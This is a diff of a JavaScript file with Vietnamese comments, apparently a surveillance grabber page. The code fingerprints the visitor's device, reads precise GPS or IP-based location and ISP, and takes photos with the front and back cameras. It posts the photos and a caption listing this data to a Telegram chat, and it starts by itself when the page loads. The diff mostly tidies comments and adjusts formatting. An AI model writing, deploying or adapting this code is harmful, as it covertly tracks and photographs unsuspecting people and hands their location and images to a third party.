@@ -16,7 +16,7 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
-// Nhận diện thiết bị
+// ✅ Nhận diện thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
   if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -38,10 +38,12 @@ function detectDevice() {
   }
 }
 
-// Lấy vị trí chính xác bằng GPS (hoặc fallback qua IP)
+// ✅ Nếu có GPS thì lấy địa chỉ chính xác, ngược lại fallback IP
 function getPreciseLocationOrFallbackToIP() {
   return new Promise(resolve => {
-    if (!navigator.geolocation) return getIPInfo().then(resolve);
+    if (!navigator.geolocation) {
+      return getIPInfo().then(resolve);
+    }
 
     navigator.geolocation.getCurrentPosition(
       async pos => {
@@ -62,26 +64,27 @@ function getPreciseLocationOrFallbackToIP() {
         info.isp = 'Không rõ';
         resolve();
       },
-      err => {
+      async err => {
         console.warn('❌ GPS bị từ chối, chuyển sang IP:', err.message);
-        getIPInfo().then(resolve);
+        await getIPInfo();
+        resolve();
       },
       { enableHighAccuracy: true, timeout: 5000 }
     );
   });
 }
 
-// Lấy thông tin qua IP (nếu GPS không được cấp quyền)
+// ✅ Lấy thông tin qua IP dân cư
 function getIPInfo() {
   return fetch("https://ipwho.is/")
     .then(res => res.json())
     .then(data => {
       info.ip = data.ip;
       info.isp = data.connection?.org || 'Không rõ';
-      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
+      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
       info.country = data.country;
-      info.lat = data.latitude;
-      info.lon = data.longitude;
+      info.lat = data.latitude?.toFixed(6) || '0';
+      info.lon = data.longitude?.toFixed(6) || '0';
     })
     .catch(() => {
       info.ip = 'Không rõ';
@@ -93,7 +96,7 @@ function getIPInfo() {
     });
 }
 
-// Tạo caption gửi về Telegram
+// ✅ Caption gửi về Telegram
 function getCaption() {
   return `
 📡 [THÔNG TIN TRUY CẬP]
@@ -111,7 +114,7 @@ function getCaption() {
 `.trim();
 }
 
-// Chụp ảnh từ camera trước/sau
+// ✅ Chụp camera
 function captureCamera(facingMode = "user") {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -137,7 +140,7 @@ function captureCamera(facingMode = "user") {
   });
 }
 
-// Gửi 2 ảnh về Telegram kèm caption
+// ✅ Gửi ảnh về Telegram
 async function sendTwoPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -161,7 +164,7 @@ async function sendTwoPhotos(frontBlob, backBlob) {
   });
 }
 
-// Hàm chính khởi động
+// ✅ Gọi chính
 async function main() {
   detectDevice();
 
@@ -182,7 +185,7 @@ async function main() {
   if (frontBlob && backBlob) {
     await sendTwoPhotos(frontBlob, backBlob);
   } else {
-    fetch(API_SEND_TEXT, {
+    await fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -193,5 +196,5 @@ async function main() {
   }
 }
 
-// Gọi thủ công từ popup/nút kích hoạt
+// ✅ Gọi thủ công
 main();
